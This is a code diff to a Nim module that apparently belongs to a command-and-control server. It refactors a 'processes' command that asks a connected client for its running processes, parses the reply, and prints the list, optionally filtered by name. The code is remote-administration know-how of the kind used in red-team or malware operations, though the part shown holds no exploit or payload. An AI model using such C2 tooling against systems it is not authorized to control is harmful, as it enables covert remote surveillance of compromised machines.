@@ -2,35 +2,38 @@ import ../prelude
 
 proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
   for client in server.cli.handlingClient:
+    
     let task = await client.sendClientTask("processes")
-    if not task.isNil(): 
-      await task.awaitResponse()
-      var processes: seq[tuple[id: int32, name: string]]
-      
-      let p = initParser()
-      p.setBuffer(cast[seq[byte]](task.output.data))
+    if task.isNil(): 
+      return
 
-      let psCount = p.extractInt32()
-      for _ in 1..psCount:
-        processes.add (
-          id: p.extractInt32(),
-          name: p.extractString()
-        )
+    await task.awaitResponse()
+    var processes: seq[tuple[id: int32, name: string]]
+    
+    let p = initParser()
+    p.setBuffer(cast[seq[byte]](task.output.data))
 
-      if args.len < 1: 
-        printTable(toJson processes)
-        return 
+    let psCount = p.extractInt32()
+    for _ in 1..psCount:
+      processes.add (
+        id: p.extractInt32(),
+        name: p.extractString()
+      )
 
-      var filteredProcesses: seq[tuple[id: int32, name: string]]
-      for process in processes:
-        if not ( args[0].toLowerAscii() in process.name.toLowerAscii() ): continue
-        filteredProcesses.add (id: process.id, name: process.name)
+    if args.len < 1: 
+      printTable(toJson processes)
+      return 
 
-      if filteredProcesses.len == 0:
-        infoLog "no processes found with name"
-        return
-      
-      printTable(toJson filteredProcesses)
+    var filteredProcesses: seq[tuple[id: int32, name: string]]
+    for process in processes:
+      if not ( args[0].toLowerAscii() in process.name.toLowerAscii() ): continue
+      filteredProcesses.add (id: process.id, name: process.name)
+
+    if filteredProcesses.len == 0:
+      infoLog "no processes found with name"
+      return
+    
+    printTable(toJson filteredProcesses)
 
 let cmd*: Command = Command(
   execProc: execProc,
